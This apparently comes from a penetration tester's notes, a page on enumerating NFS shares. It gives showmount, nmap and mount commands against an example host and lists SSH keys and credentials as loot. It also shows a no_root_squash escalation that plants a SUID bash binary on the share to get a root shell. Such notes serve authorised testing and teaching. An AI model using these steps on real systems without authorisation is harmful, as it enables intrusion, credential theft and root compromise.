---
tags: [pentest, enumeration, nfs, fileshare, linux, recon]
tool: showmount, nmap
phase: 3
---
# NFS Enumeration

Network File System (port 2049). Often misconfigured to allow unauthenticated access to shares.

[[04 - Enumeration/00 - README|Folder index]]

## Enumerate exports

```bash
# List NFS shares
showmount -e 10.10.10.10

# nmap NSE
nmap --script nfs-ls,nfs-showmount,nfs-statfs -p 2049 10.10.10.10
```

## Mount an NFS share

```bash
# Create mount point
sudo mkdir /mnt/nfs

# Mount the share
sudo mount -t nfs 10.10.10.10:/share /mnt/nfs

# Mount with no root squash workaround
sudo mount -o vers=3 10.10.10.10:/share /mnt/nfs

# Browse
ls -la /mnt/nfs/

# Unmount when done
sudo umount /mnt/nfs
```

## What to look for

| Finding | Impact |
| --- | --- |
| `*` in export list | Everyone can mount |
| `.ssh` directory accessible | Grab SSH keys |
| Home directories | Config files, credentials |
| Backup files | Database dumps, configs |
| no_root_squash | You can write as root → privesc |

## no_root_squash exploitation

If the export has `no_root_squash`, root on your machine = root on the NFS share:

```bash
# Create SUID binary on NFS share
sudo cp /bin/bash /mnt/nfs/rootbash
sudo chmod +s /mnt/nfs/rootbash
# On target: /share/rootbash -p → root shell
```

## See also

- [[02 - smbclient]] — SMB share enumeration (similar concept)
